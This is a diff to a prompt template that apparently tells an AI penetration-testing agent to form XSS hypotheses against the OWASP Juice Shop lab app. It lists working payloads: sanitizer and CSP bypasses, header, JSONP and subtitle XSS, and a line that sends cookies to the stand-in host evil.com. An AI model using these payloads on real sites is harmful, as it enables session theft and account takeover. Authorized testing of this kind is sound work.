@@ -51,6 +51,45 @@ Each hypothesis must be specific, actionable, and grounded in evidence from the 
 - **sanitize-html bypass:** Version 1.4.2 has known bypasses (CVE-2016-1000237). Nested tag confusion: `<<b>script>alert(1)<</b>/script>`
 - **User registration fields:** `POST /api/Users` — email, username fields may store XSS payloads that render in admin panels
 
+### JSONP Callback XSS (Shannon XSS-VULN-02)
+- **Endpoint:** `GET /rest/user/whoami?callback=<payload>`
+- **Mechanism:** The `/rest/user/whoami` endpoint accepts a `callback` query parameter for JSONP responses. If the callback value is reflected without sanitization in the response body (e.g. `<payload>({"user":...})`), an attacker can inject arbitrary JavaScript via the callback name.
+- **Proof mechanism:** Use `browser_navigate` to load a crafted URL that invokes the JSONP endpoint via `<script src>` injection or directly navigate and check if the callback content-type allows script execution. Alternatively test via `<script src="{{TARGET_URL}}/rest/user/whoami?callback=alert(document.cookie)"></script>` embedded in a page.
+- **Key payloads:** `alert(1)//`, `alert(document.cookie)//`, `fetch('http://evil.com?c='+document.cookie)//`
+
+### Server-Side XSS Protection Bypass (Write-up 4-star)
+- **Endpoint:** `POST /api/Feedbacks` (or any endpoint with server-side HTML sanitization)
+- **Mechanism:** The server uses a library to strip `<script>` tags and known XSS vectors before storage. However, non-standard payload encodings or nested tag tricks can bypass this. Example: `<img src="javascript:alert('xss')">` may bypass filters that only strip `<script>`. Also try `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('xss')>` (HTML entity encoding).
+- **Proof mechanism:** POST the payload via API, then navigate to admin page with Playwright to check if the payload survived sanitization and executes.
+
+### X-Header XSS (Write-up 4-star `x_header_xss`)
+- **Endpoint:** Any request where Juice Shop reflects HTTP headers in error pages or admin logs
+- **Mechanism:** Inject XSS payload in the `X-Forwarded-For`, `True-Client-IP`, or `X-User-Id` HTTP headers. If the application logs or displays these headers without sanitization (e.g., in last login IP display, admin access logs, or error pages), the stored payload executes when an admin views the data.
+- **Key payloads:**
+  - `X-Forwarded-For: <iframe src="javascript:alert('xss')">`
+  - `True-Client-IP: <img src=x onerror=alert('xss')>`
+- **Proof mechanism:** Send HTTP requests with XSS payloads in headers, then navigate with Playwright to pages that display the header data (admin panel, user profile "last login IP").
+
+### Video XSS via Subtitles (Write-up 6-star `video_xss`)
+- **Endpoint:** `POST /file-upload` or `/video` endpoint accepting media files
+- **Mechanism:** Upload a video file (or a crafted `.mp4`/`.webm`) with an embedded subtitle track (`.vtt` WebVTT format) containing XSS payload. When the video is rendered in the browser with `<track>` subtitle support, the XSS payload in the subtitle cue text executes. Alternatively, craft a malicious VTT file:
+  ```
+  WEBVTT
+
+  00:00:00.000 --> 00:00:01.000
+  <img src=x onerror=alert('VideoXSS')>
+  ```
+  Upload and navigate to the page that renders the video with subtitles.
+- **Proof mechanism:** Upload the crafted subtitle/video file, navigate to the page displaying it with Playwright, and check for dialog events or DOM injection.
+
+### CSP Bypass via Base Tag or Data URI
+- **Endpoint:** `GET /#/search?q=` or any injectable page
+- **Mechanism:** If the application has a Content Security Policy (CSP), bypass it using:
+  - `<base href="https://attacker.com/">` — redirects all relative URL fetches to the attacker's domain
+  - `<meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline'">` — attempt to override CSP via injected meta tag
+  - `data:text/html,<script>alert('csp-bypass')</script>` in `<iframe src>` or `<object data>`
+- **Proof mechanism:** Inject base tag or data URI payload via search, check with Playwright if script execution occurs despite CSP.
+
 ## Hypothesis Format
 
 For EACH hypothesis, use this EXACT format:
@@ -69,13 +108,28 @@ For EACH hypothesis, use this EXACT format:
 ## MANDATORY Hypotheses
 
 Your output MUST include hypotheses for ALL of the following (at minimum):
+
+### Core DOM/Stored XSS
 1. **DOM XSS via search** — `GET /#/search?q=<iframe src="javascript:alert(xss)">` — proven by Playwright dialog capture
 2. **Stored XSS via feedback** — `POST /api/Feedbacks` with `comment` containing XSS payload — proven by navigating to admin page
 3. **Stored XSS via user registration** — `POST /api/Users` with email/username containing XSS — proven by API response showing unescaped payload
 
+### JSONP & Reflected XSS
+4. **JSONP callback XSS** — `GET /rest/user/whoami?callback=alert(document.cookie)//` — reflected XSS via JSONP endpoint. Prove that the callback parameter is reflected unsanitized in the response body with a script-executable content type. Test by embedding `<script src="{{TARGET_URL}}/rest/user/whoami?callback=alert(document.cookie)//"></script>` in an HTML page or navigating directly.
+5. **Server-side XSS protection bypass** — `POST /api/Feedbacks` with a payload that bypasses server-side sanitization: `<img src="javascript:alert('xss')">` or `<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('serverbypass')>`. Prove by checking that the payload survives server-side stripping and executes when rendered in the admin panel via Playwright.
+
+### Header & Media XSS
+6. **X-Header XSS** — Send requests with `X-Forwarded-For: <iframe src="javascript:alert('xheader')">` header to any endpoint. Then navigate to the admin panel or user profile pages (e.g. last login IP display) with Playwright to check if the header value is rendered unescaped and triggers script execution.
+7. **Video XSS via subtitles** — Upload a crafted video or `.vtt` subtitle file containing `<img src=x onerror=alert('VideoXSS')>` via `POST /file-upload` or the complaint/profile upload flow. Navigate to the page rendering the video to check for dialog events via Playwright.
+
+### Sanitizer & Policy Bypass
+8. **sanitize-html nested tag bypass (CVE-2016-1000237)** — `POST /api/Feedbacks` with comment `<<b>script>alert(1)<</b>/script>` exploiting sanitize-html 1.4.2 tag confusion. Prove stored execution via admin panel navigation with Playwright.
+9. **Bonus Payload** — The Juice Shop 1-star XSS challenge uses a specific well-known XSS payload. Test the canonical `<script>alert('xss')</script>` payload on the search page and feedback endpoints as a baseline. Also try `<b onmouseover=alert('xss')>click me!</b>` as an interaction-based variant.
+10. **CSP bypass via `<base>` tag or `data:` URI** — `GET /#/search?q=<base href="https://attacker.com/">` or `<iframe src="data:text/html,<script>alert('csp')</script>">` — attempt to circumvent Content Security Policy restrictions. Check via Playwright whether script execution is achieved despite CSP headers.
+
 ## Required Output
 
-Produce a markdown document with the heading `## Hypotheses` followed by at least 5 numbered hypotheses. Example structure:
+Produce a markdown document with the heading `## Hypotheses` followed by at least 10 numbered hypotheses. Example structure:
 
 ```markdown
 ## Hypotheses
@@ -110,6 +164,45 @@ Since `bypassSecurityTrustHtml` explicitly disables Angular's built-in sanitizer
 - `<img src=x onerror=alert('xss')>` — triggers alert via error handler
 - `<svg onload=alert('xss')>` — triggers alert via SVG load event
 - `<audio src=x onerror=alert('xss')>` — alternative event handler
+
+### JSONP callback XSS:
+The `/rest/user/whoami` endpoint reflects the `callback` parameter in the response:
+- `alert(document.cookie)//` — basic callback injection
+- `alert(1)//` — minimal proof payload
+- Navigate to `{{TARGET_URL}}/rest/user/whoami?callback=alert(document.cookie)//` and check if the response Content-Type allows execution
+- Embed via `<script src="{{TARGET_URL}}/rest/user/whoami?callback=alert('jsonp')//"></script>` on an injectable page
+
+### Server-side XSS filter bypass:
+Server-side sanitization strips `<script>` tags but may miss:
+- `<img src="javascript:alert('xss')">` — javascript: protocol in img src
+- `<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('xss')>` — HTML entity encoded javascript:
+- `<body onload=alert('xss')>` — body event handler
+- `<input onfocus=alert('xss') autofocus>` — autofocus-triggered event
+- `%3Cscript%3Ealert('xss')%3C/script%3E` — URL-encoded script tags
+
+### X-Header XSS via HTTP headers:
+Inject payloads in HTTP request headers that may be logged/displayed:
+- `X-Forwarded-For: <iframe src="javascript:alert('xheader')">`
+- `True-Client-IP: <img src=x onerror=alert('header-xss')>`
+- `X-User-Id: <svg onload=alert('xss')>`
+- These execute when an admin views access logs or "last login" displays
+
+### Video/Subtitle XSS:
+Craft a WebVTT subtitle file with embedded XSS:
+```
+WEBVTT
+
+00:00:00.000 --> 00:00:10.000
+<img src=x onerror=alert('VideoXSS')>
+```
+- Upload as `.vtt` or embedded in a video container
+- The browser's native subtitle renderer may execute inline HTML in cue text
+
+### CSP bypass payloads:
+- `<base href="https://attacker.com/">` — hijack relative URLs
+- `<iframe src="data:text/html,<script>alert('csp')</script>">` — data URI bypass
+- `<object data="data:text/html,<script>alert('csp')</script>">` — object element bypass
+- `<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">` — override CSP via meta tag
 
 ### Angular template injection (if Angular processes expressions):
 - `{{constructor.constructor('alert(1)')()}}`
